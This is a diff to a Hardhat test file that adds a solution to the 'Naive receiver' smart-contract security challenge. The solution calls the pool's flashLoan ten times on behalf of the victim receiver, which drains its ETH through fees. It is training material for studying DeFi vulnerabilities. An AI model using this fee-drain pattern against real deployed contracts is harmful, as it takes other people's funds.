@@ -1,5 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { parseBytes32String } = require('ethers/lib/utils');
+const { randomBytes } = require('crypto');
 
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, player;
@@ -38,6 +40,10 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const addressToken = await pool.ETH()
+        for (let index = 0; index < 10; index++) {
+            await pool.connect(player).flashLoan(receiver.address, addressToken, 0, "0x");
+        }
     });
 
     after(async function () {
